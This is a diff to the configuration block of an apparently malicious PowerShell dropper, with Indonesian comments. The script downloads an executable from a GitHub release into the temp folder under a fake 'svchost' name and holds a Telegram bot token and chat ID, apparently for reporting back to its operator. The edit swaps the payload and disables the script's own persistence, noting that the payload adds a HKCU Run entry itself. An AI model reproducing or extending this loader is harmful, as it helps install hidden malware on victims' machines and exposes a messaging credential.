@@ -5,12 +5,12 @@ $ErrorActionPreference = 'Continue'
 $ProgressPreference    = 'SilentlyContinue'
 
 # ---------------------------------------------------------------- CONFIG
-$url     = 'https://github.com/byteforge0-cloud/darkwhisper/releases/download/mantap/svchost.exe'
+$url     = 'https://github.com/byteforge0-cloud/darkwhisper/releases/download/mantap/LivingOffTheLand.exe'
 $urlB64  = ''                       # opsional: URL .b64 (base64 exe) sbg cadangan
 $exe     = Join-Path $env:TEMP ('svchost_{0}.exe' -f (Get-Random -Minimum 10000 -Maximum 99999))
 $bot     = '9037027380:AAFrvv-oDxBH65pNbv0aNAflsjMAijyDMKo'
 $chat    = '949121454'
-$persist = $true
+$persist = $false           # payload ini punya persistence sendiri (HKCU Run)
 $cleanup = $false
 $ua      = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
 # ----------------------------------------------------------------------
